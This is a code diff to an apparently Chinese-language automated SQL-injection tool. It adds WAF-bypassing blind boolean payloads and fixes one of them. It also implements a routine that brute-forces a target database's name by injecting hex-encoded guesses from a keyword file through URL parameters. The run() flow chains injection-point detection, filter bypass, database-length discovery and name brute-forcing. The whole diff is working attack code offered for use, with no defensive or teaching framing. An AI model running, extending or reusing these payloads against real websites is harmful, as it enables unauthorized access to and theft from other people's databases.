@@ -37,6 +37,7 @@ import argparse
 import time
 import traceback
 import logging
+import binascii
 from lxml import etree
 from log import Journal
 # from logging.handlers import RotatingFileHandler
@@ -252,7 +253,7 @@ class Payload2(object):
 
     payloads3 = "%20%26%26%20(length(database/**/())={})"
     payloads4 = "%20%26%26%20(length(hex(database/**/()))={})"
-    payloads5 = "%20%26%26%20(left(hex(database/**/()),{})={}"
+    payloads5 = "%20%26%26%20(left(hex(database/**/()),{})={})"
 
     payloads6 = "%20%26%26%20(1=(select%20count(/*!{}*/)%20from%20information_Schema.tables%20where%20table_schema=0x{}))"
     payloads7 = "%20%26%26%20hex/**/(substr((select%20concat(/*!{}*/)%20from%20information_schema.taBles%20where%20table_schema=0x{}%20limit%20{}),{}))"
@@ -465,7 +466,7 @@ class RePLace(Payload1,
                         if i == 0:
                             if r:
                                 return False
-                        return r
+                        return (r,i)
                 i += 1
             return False
         except Exception as e:
@@ -489,7 +490,7 @@ class RePLace(Payload1,
                                 if i == 0:
                                     if r:
                                         return False
-                                return r
+                                return (r,i)
                     i += 1
                 return False    
             except Exception as e:
@@ -518,7 +519,7 @@ class RePLace(Payload1,
                         if i == 0:
                             if r:
                                 return False
-                        return r
+                        return (r,i)
                 i += 1
             return False
         except Exception as e:
@@ -542,7 +543,7 @@ class RePLace(Payload1,
                                 if i == 0:
                                     if r:
                                         return False
-                                return r
+                                return (r,i)
                     i += 1
                 return False    
             except Exception as e:
@@ -551,13 +552,56 @@ class RePLace(Payload1,
 
 
     
-    def Get_the_database_name(self,url):
+    def Get_the_database_name(self,url,content):
         """
-        3.获取数据库名(GET)
+        3.爆破数据库名(GET)
         """
-        pass
+        try:
+            result = []
+            u1 = self.nurl_(url)
+            url1 = u1[0]
+            pars1 = u1[1]
+            value1 = u1[2]
+            payloads = self.payloads5
+            content = binascii.b2a_hex(bytes(content,'utf-8')).decode()
+            urls = url1 + pars1 + '{}'.format(value1).strip() + payloads.format(len(content),content).strip()
+            print('payloads9 -> '+urls)
+            r = self.req_(urls)
+            result.append(r)
+            i = 0
+            for results in result:
+                #判断回显
+                if self.ekd[0] not in results or self.ekd[1] not in results:
+                    content = binascii.a2b_hex(bytes(content,'utf-8')).decode()
+                    return (results,content)
+            return False
+              
+        except Exception as e:
+            print('Error1 -> ',traceback.format_exc())
+            try:
+                result = []
+                u1 = self.nurl_(url)
+                url = u1[0]
+                pars = u1[1]
+                value = u1[2]
+                payloads = self.payloads5
+                content = binascii.b2a_hex(bytes(content,'utf-8')).decode()
+                for url1,pars1,value1 in zip(url,pars,value):
+                    urls = url1 + pars1 + '{}'.format(value1).strip() + payloads.format(len(content),content).strip()
+                    print('payloads10 -> '+urls)
+                    r = self.req_(urls)
+                    result.append(r)
+                    for results in result:
+                        #判断回显
+                        if self.ekd[0] not in results or self.ekd[1] not in results:
+                            content = binascii.a2b_hex(bytes(content,'utf-8')).decode()
+                            return (results,content)
+                return False
+            except Exception as e:
+                print('Error2 -> ',traceback.format_exc())
+                return False
 
-            
+                    
 
 
 
@@ -775,26 +819,38 @@ def run():
             s = RePLace(url,'Fuzz_WaF')
             a = s.collect_waf_page()
             if not a:
-                print('[-]不存在注入点 | payloads -> '+url)
+                print('[-]不存在注入点 | url -> '+url)
             else:
-                print('[+]存在注入点 | payloads -> '+url)
+                print('[+]存在注入点 | url -> '+url)
                 a = s.Injection_point_test(url)
                 if not a:
-                    print('[-]过滤绕过失败 | payloads -> '+url)
+                    print('[-]过滤绕过失败 | url -> '+url)
                 else:
-                    print('[+]过滤绕过成功 | payloads -> '+url)
+                    print('[+]过滤绕过成功 | url -> '+url)
                     a = s.Judging_database_length1(url)
                     if not a:
-                        print('[-]获取数据库长度失败 | payloads1 -> '+url)
+                        print('[-]获取数据库长度失败 | url1 -> '+url)
                         a = s.Judging_database_length2(url)
                         if not a:
-                            print('[-]获取数据库长度失败 | payloads2 -> '+url)
+                            print('[-]获取数据库长度失败 | url2 -> '+url)
                         else:
-                            print('[+]获取数据库长度成功 | payloads2 -> '+url)
-                            print('Result2 -> ',a)
+                            print('[+]获取数据库长度成功 | url2 -> '+url)
+                            print('[+]当前数据库长度为:{}'.format(a[1]))
+                            print('Result2 -> ',a[0])
                     else:
-                        print('[+]获取数据库长度成功 | payloads -> '+url)
-                        print('Result1 -> ',a)
+                        print('[+]获取数据库长度成功 | url2 -> '+url)
+                        print('[+]当前数据库长度为:{}'.format(a[1]))
+                        print('Result1 -> ',a[0])
+                        with open('txt/keywords2.txt','r') as r:
+                            for line in r.readlines():
+                                a = s.Get_the_database_name(url,line.strip())
+                                if not a:
+                                    print('[-]爆破数据库名称失败 | url -> '+url)
+                                else:
+                                    print('[+]爆破数据库名称成功 | url -> '+url)
+                                    print('[+]数据库名称:{}'.format(a[1]))
+                                    print('Result -> ',a[0])
+                                    
 
                     
 
